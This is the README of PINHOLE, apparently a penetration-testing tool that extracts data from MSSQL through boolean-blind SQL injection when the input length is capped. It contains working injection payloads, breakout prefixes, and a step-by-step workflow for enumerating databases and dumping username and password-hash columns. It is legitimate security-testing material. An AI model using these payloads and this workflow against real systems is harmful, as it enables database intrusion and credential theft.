# PINHOLE

```
    ██████╗ ██╗███╗   ██╗██╗  ██╗ ██████╗ ██╗     ███████╗
    ██╔══██╗██║████╗  ██║██║  ██║██╔═══██╗██║     ██╔════╝
    ██████╔╝██║██╔██╗ ██║███████║██║   ██║██║     █████╗
    ██╔═══╝ ██║██║╚██╗██║██╔══██║██║   ██║██║     ██╔══╝
    ██║     ██║██║ ╚████║██║  ██║╚██████╔╝███████╗███████╗
    ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
         ·  ( o )  boolean-blind SQLi through a tiny hole
```

**A minimal boolean-blind SQL injection extractor for MSSQL targets behind an aggressive input-length filter — the kind that makes sqlmap fail.**

> ⚠️ **For authorized security testing only.** Use PINHOLE only against systems you own or have explicit written permission to test. You are responsible for staying within the scope of your engagement and the law.

---

## Why it exists

Some targets cap the length of an injectable parameter — app-level field validation (a `VARCHAR(50)` column with a matching check), a Suhosin-style limit, or a WAF rule. On such a target the injection can be **real and confirmed**, yet sqlmap still fails to extract anything.

The reason is payload length. sqlmap's boolean extraction wraps every character read in:

```sql
... AND UNICODE(SUBSTRING((SELECT SYSTEM_USER),1,1))>64
```

That's ~68 characters before the comment. If the parameter cap is, say, 50, every extraction payload overflows and returns a 500 — so sqlmap confirms the DBMS but can't read a single byte.

PINHOLE uses the **shortest possible per-bit payload** instead — a direct equality test, no `UNICODE`, no `(SELECT ...)` wrapper, no numeric bisection:

```sql
... AND SUBSTRING(SYSTEM_USER,1,1)='c'
```

~49 characters. It slips under the cap where sqlmap can't.

| | sqlmap | PINHOLE |
|---|---|---|
| char-read form | `UNICODE(SUBSTRING((SELECT x),n,1))>N` | `SUBSTRING(x,n,1)='c'` |
| approx length (scalar) | ~68 chars | ~49 chars |
| under a ~50–60 char cap | payloads 500 | fits |

PINHOLE does **less** than sqlmap by design — it's a scalpel for one specific problem (length-capped boolean-blind MSSQL), not a replacement. When sqlmap works, use sqlmap.

---

## Features

- **Minimal per-bit payloads** — equality form, not `UNICODE` bisection.
- **Per-character verification** — each matched character is re-confirmed and an unmatched position is retried, to defeat flaky/noisy oracles.
- **Backend-affinity pinning** — pins the `ARRAffinity` cookie to one node so load-balanced targets stop flipping the oracle (toggle with `--no-pin`).
- **Vote per bit** — `--votes N` reads each bit N times and takes the majority.
- **Cap awareness** — `--calibrate` measures the payload-length budget, and over-budget probes are reported as *unreachable* instead of silently returning junk.
- **Wordlist guessing** — guess databases (`DB_ID()`), tables and columns by name when catalog views are permission-denied to a non-DBA login.
- **Live sqlmap-style output** and result tables.
- **SQLite storage** — everything lands in `loot.db`.

---

## Requirements

- Python 3.8+
- `requests`

```bash
pip install requests
```

---

## Install

```bash
git clone https://github.com/Bwp110/pinhole
cd pinhole
chmod +x pinhole
./pinhole --help
```

---

## Quick start

### 1. Save the request and mark the injection point

Save the raw HTTP request to a file and put a single `*` where your payload goes:

```
GET /api/search?name=admin*&page=1 HTTP/1.1
Host: target.example.com
Cookie: session=...
```

Here the marker follows the value `admin`, so the breakout is `--prefix "' AND "`.
(If you replace the whole value — `name=*` — use `--prefix "admin' AND "`.)

### 2. Find a TRUE-string

Pick a string that appears **only** in a TRUE (row-returning) response and never in an empty one. Pass it with `--true-string`. This is the oracle — without a reliable one, nothing else works.

### 3. Extract

```bash
./pinhole -r req.txt --force-ssl --true-string "admin@corp.com" --current-user --current-db --banner --is-dba
```

---

## Workflow

PINHOLE follows the same stages as sqlmap:

```bash
# Stage 0 — confirm the oracle and measure the length cap
./pinhole -r req.txt --true-string "TOKEN" --calibrate --current-db

# Stage 1 — server scalars (shortest payloads, almost always reachable)
./pinhole -r req.txt --true-string "TOKEN" --current-user --current-db --banner --is-dba

# Stage 2 — databases
./pinhole -r req.txt --true-string "TOKEN" --dbs          # via sys.databases (needs privilege)
./pinhole -r req.txt --true-string "TOKEN" --guess-dbs    # via DB_ID(), no privilege needed

# Stage 3 — tables in a database
./pinhole -r req.txt --true-string "TOKEN" --tables -D AppDB
./pinhole -r req.txt --true-string "TOKEN" --guess-tables            # built-in name list
./pinhole -r req.txt --true-string "TOKEN" --guess-tables names.txt  # your wordlist

# Stage 4 — columns in a table
./pinhole -r req.txt --true-string "TOKEN" --columns -T Users
./pinhole -r req.txt --true-string "TOKEN" --guess-columns -T Users

# Stage 5 — dump named columns
./pinhole -r req.txt --true-string "TOKEN" --dump -T Users -C username,PasswordHash --max-rows 10
```

Read the loot afterwards:

```bash
sqlite3 loot.db "SELECT rownum, col, value FROM data ORDER BY rownum, col"
```

---

## Catalog enumeration vs. guessing

Reading `sys.databases` / `sys.tables` / `sys.columns` (the `--dbs` / `--tables` / `--columns` flags) requires privileges a **non-DBA login usually doesn't have**, and those subqueries are long. When they come back empty, switch to guessing:

- `--guess-dbs` tests `DB_ID('name')>0` — works without catalog access, short payload.
- `--guess-tables` tests `(SELECT COUNT(*) FROM name)>=0` — queries the table directly, no catalog, short payload.
- `--guess-columns -T tbl` tests `(SELECT COUNT(col) FROM tbl)>=0`.

Each has a built-in generic name list (~50 entries) tuned to fit tight caps; pass your own wordlist file as an argument to any of them. PINHOLE skips (and reports) any candidate whose payload would exceed the measured cap.

---

## The length cap decides what's reachable

Every payload must fit the target's cap. Rough sizes:

| Reading | Example payload | ~chars |
|---|---|---|
| scalar (DB name, login) | `SUBSTRING(DB_NAME(),1,1)='c'` | ~30 + breakout |
| name guess | `(SELECT COUNT(*) FROM Users)>=0` | ~30 + breakout |
| **table cell** | `SUBSTRING((SELECT TOP 1 col FROM tbl),1,1)='c'` | ~55 + breakout |

On a very tight cap (≈50 chars), scalars and name-guesses fit but **table-cell reads may not** — the table + column names alone can push the payload over. PINHOLE tells you (`over cap — unreachable`) rather than returning blanks. If that happens, your options are:

- test another injectable parameter that may have a larger cap, or
- accept scalar/metadata-level extraction for the finding.

---

## Options

```
-r, --request FILE      raw HTTP request with a single '*' injection marker
--force-ssl             force https
--proxy URL             route through a proxy (e.g. http://127.0.0.1:8080 for Burp)
--timeout SEC           per-request timeout (default 20)
--delay SEC             delay between requests
--votes N               reads per bit, majority wins (raise on noisy targets)
--no-pin                do not pin the ARRAffinity backend cookie

--prefix STR            text before the injected condition (breakout)
--suffix STR            comment terminator after the condition
--true-string STR       string present only in TRUE responses (the oracle)
--false-string STR      string present only in FALSE responses (alternative oracle)
--false-default STR     body that means FALSE when no strings given (default: [])
--charset STR           characters to test per position

--max-payload N         payload length cap in chars (0=off); over-cap probes skipped
--calibrate             measure the payload-length budget at startup

--current-user          SYSTEM_USER
--current-db            DB_NAME()
--banner                @@VERSION
--is-dba                sysadmin membership
--dbs                   enumerate databases       (needs privilege)
--tables   -D db        enumerate tables          (needs privilege)
--columns  -T tbl       enumerate columns         (needs privilege)
--dump     -T tbl -C .. dump named columns
--guess-dbs [WORDLIST]      guess database names via DB_ID()
--guess-tables [WORDLIST]   guess table names (direct FROM, no catalog)
--guess-columns [WORDLIST]  guess columns in -T TABLE
--max-rows N            cap rows on --dump (0=all)
-o, --output FILE       SQLite output file (default loot.db)
```

---

## Tips for noisy / load-balanced targets

- Keep affinity pinning on (default). If the oracle still flips, raise `--votes` (5–7) and add `--delay 0.3` so votes sample across time.
- If `--calibrate` under-reports the cap (a noisy probe can), set it explicitly with `--max-payload N` using a value you've confirmed by hand.
- Route through Burp with `--proxy http://127.0.0.1:8080` to watch the exact payloads on the wire.

---

## Scope & current limits

- **MSSQL only.** The query builders and functions (`DB_NAME`, `SYSTEM_USER`, `DB_ID`, `sys.*`, `SUBSTRING`, `OFFSET/FETCH`) are SQL Server specific.
- **Boolean-blind only.** No UNION, error-based, or time-based techniques.
- Designed for **length-capped** targets; on an unconstrained target, sqlmap is faster and more complete.

Contributions welcome — other DBMS back-ends and dump paging improvements are the obvious next steps.

---

## License

MIT — see [LICENSE](LICENSE).
